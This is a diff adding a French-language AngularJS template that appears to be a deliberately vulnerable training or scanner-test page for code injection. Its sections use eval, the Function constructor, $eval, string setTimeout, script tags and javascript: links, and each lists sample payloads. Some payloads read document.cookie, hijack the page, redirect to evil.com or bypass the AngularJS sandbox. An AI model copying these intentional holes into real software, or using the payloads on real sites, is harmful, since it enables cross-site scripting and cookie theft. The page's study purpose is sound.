@@ -1,0 +1,172 @@
+<div class="panel panel-danger">
+    <div class="panel-heading">
+        <h2>Injection de Code (AngularJS)</h2>
+    </div>
+    <div class="panel-body">
+        
+        <!-- Section 1: eval() -->
+        <div class="well">
+            <h3>1. eval() Direct</h3>
+            <textarea ng-model="codeInput" class="form-control" rows="3" 
+                      placeholder="Ex: alert('Injected!')"></textarea>
+            <button ng-click="executeEval()" class="btn btn-danger">Exécuter eval()</button>
+            <p>Résultat: {{evalResult}}</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>alert('Code injecté via eval!')</code></li>
+                    <li><code>document.body.style.background = 'red'</code></li>
+                    <li><code>console.log(document.cookie)</code></li>
+                    <li><code>localStorage.setItem('hacked', 'true')</code></li>
+                    <li><code>for(let i=0; i<1000; i++) console.log('spam')</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 2: Function Constructor -->
+        <div class="well">
+            <h3>2. Function Constructor</h3>
+            <input type="text" ng-model="functionCode" class="form-control" placeholder="Ex: return 2 + 2">
+            <button ng-click="executeFunctionConstructor()" class="btn btn-danger">Exécuter Function()</button>
+            <p>Résultat: {{functionResult}}</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>return 'Executed: ' + navigator.userAgent</code></li>
+                    <li><code>alert('Function constructor'); return 'done'</code></li>
+                    <li><code>return Object.keys(localStorage)</code></li>
+                    <li><code>document.title = 'Hacked'; return 'title changed'</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 3: Angular $eval -->
+        <div class="well">
+            <h3>3. Angular $eval (Spécifique AngularJS)</h3>
+            <input type="text" ng-model="codeInput" class="form-control" 
+                   placeholder="Ex: 1+1 ou constructor.constructor('alert(1)')()">
+            <button ng-click="executeAngularEval()" class="btn btn-danger">$eval()</button>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester (Expressions AngularJS) :</strong>
+                <ul>
+                    <li><code>constructor.constructor('alert("$eval injection")()')</code></li>
+                    <li><code>this.constructor.constructor('return document.cookie')()</code></li>
+                    <li><code>[].map.constructor('alert(1)')()</code></li>
+                    <li><code>a = constructor.constructor; a('alert("bypassed")()')</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 4: setTimeout avec String -->
+        <div class="well">
+            <h3>4. setTimeout avec String</h3>
+            <input type="text" ng-model="timeoutCode" class="form-control" 
+                   placeholder="Ex: console.log('Timeout!')">
+            <button ng-click="executeSetTimeout()" class="btn btn-danger">setTimeout(string)</button>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>alert('setTimeout exécuté après 0ms')</code></li>
+                    <li><code>document.body.innerHTML = '&lt;h1&gt;Page hijacked&lt;/h1&gt;'</code></li>
+                    <li><code>console.error('Erreur simulée'); alert('XSS')</code></li>
+                </ul>
+                <strong>Note :</strong> setTimeout avec string = eval() caché !
+            </div>
+        </div>
+
+        <!-- Section 5: JSON.parse avec eval -->
+        <div class="well">
+            <h3>5. JSON.parse avec Fallback eval</h3>
+            <textarea ng-model="jsonInput" class="form-control" rows="3" 
+                      placeholder='Ex: {"key": "value"}'></textarea>
+            <button ng-click="parseJsonUnsafe()" class="btn btn-danger">Parser JSON</button>
+            <p>Résultat: {{jsonResult | json}}</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester (JSON invalide → eval) :</strong>
+                <ul>
+                    <li><code>({key: "value", exec: alert('JSON eval')})</code></li>
+                    <li><code>(function(){alert('Not JSON!'); return {hacked: true}})()</code></li>
+                    <li><code>{a:1, b:(function(){return 'executed'}())}</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 6: Script Injection -->
+        <div class="well">
+            <h3>6. Script Injection Dynamique</h3>
+            <textarea ng-model="scriptContent" class="form-control" rows="3" 
+                      placeholder="console.log('Script injecté!')"></textarea>
+            <button ng-click="injectScript()" class="btn btn-danger">Injecter Script</button>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>alert('Script tag injecté dynamiquement')</code></li>
+                    <li><code>fetch('/').then(r => console.log('Requête exécutée'))</code></li>
+                    <li><code>document.cookie = 'injected=true'</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 7: Event Handler -->
+        <div class="well">
+            <h3>7. Attribut Event Handler</h3>
+            <input type="text" ng-model="eventCode" class="form-control" placeholder="Ex: alert('Click!')">
+            <button ng-click="setEventHandler()" class="btn btn-danger">Créer Bouton</button>
+            <div id="dynamic-button-container"></div>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>alert('onclick exécuté')</code></li>
+                    <li><code>this.innerHTML='Hacked!'; alert('Button changed')</code></li>
+                    <li><code>document.location='https://evil.com'</code></li>
+                </ul>
+                <strong>Puis cliquez sur le bouton créé !</strong>
+            </div>
+        </div>
+
+        <!-- Section 8: Expression Interpolation -->
+        <div class="well">
+            <h3>8. AngularJS Expression Interpolation</h3>
+            <input type="text" ng-model="expressionInput" class="form-control" 
+                   placeholder="constructor.constructor('alert(1)')()">
+            <button ng-click="interpolateExpression()" class="btn btn-danger">Interpoler</button>
+            <p>{{expressionResult}}</p>
+            <!-- Changé pour éviter l'exécution automatique -->
+            <div>Direct: <span ng-bind="expressionInput"></span></div>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester (AngularJS Sandbox Bypass) :</strong>
+                <ul>
+                    <li><code>constructor.constructor('alert("Sandbox bypassed")()')</code></li>
+                    <li><code>this.toString.constructor.prototype.toString=this.constructor.prototype.constructor;this.toString.constructor("alert(1)")()</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 9: javascript: protocol -->
+        <div class="well">
+            <h3>9. JavaScript Protocol</h3>
+            <button ng-click="executeViaProtocol()" class="btn btn-danger">
+                Execute via javascript:
+            </button>
+            <!-- VULNÉRABLE: href avec binding - DÉTECTÉ -->
+            <a ng-href="javascript:{{codeInput}}">Lien dangereux</a>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ol>
+                    <li>Dans le champ de la section 1, entrez : <code>alert('javascript: protocol')</code></li>
+                    <li>Cliquez sur "Execute via javascript:" ou sur "Lien dangereux"</li>
+                </ol>
+            </div>
+        </div>
+
+    </div>
+</div>
